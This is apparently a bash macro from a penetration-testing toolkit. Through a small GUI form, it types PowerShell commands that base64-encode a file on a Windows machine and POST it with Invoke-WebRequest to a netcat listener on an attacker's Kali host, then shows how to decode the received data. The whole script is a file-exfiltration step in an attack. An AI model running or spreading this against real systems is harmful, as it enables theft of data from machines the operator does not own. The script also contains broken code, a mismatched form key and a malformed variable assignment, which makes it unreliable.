#!/bin/bash

: '
ps: upload attacker file to nc as base64
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item  "file" "file")
HTTP_PORT_FIELD=$(form_item  "http port" "http_port")

# Generate GUI form
generate_form "${FILE_FIELD}" "${HTTP_PORT_FIELD}"

FILE=${form_data["file"]}
HTTP_PORT=${form_data["Http port"]}
BASE_FILE_NAME= $(basename $FILE)

execute_command "\$Base64String = [System.convert]::ToBase64String((Get-Content -Path '${FILE}' -Encoding Byte))"
create_new_line
sleep 2

execute_command "# Be sure nc -lvnp ${HTTP_PORT} is running"
create_new_line
sleep 3

execute_command "Invoke-WebRequest -Uri http://${KALI_IP}:${HTTP_PORT} -Method POST -Body $Base64String"
create_new_line
sleep 1

execute_command "# check the port listening terminal and execute the following to save the file"
create_new_line
sleep 1

execute_command "# echo <base64 encoded file> | base64 -d -w 0 > ${BASE_FILE_NAME}"
create_new_line
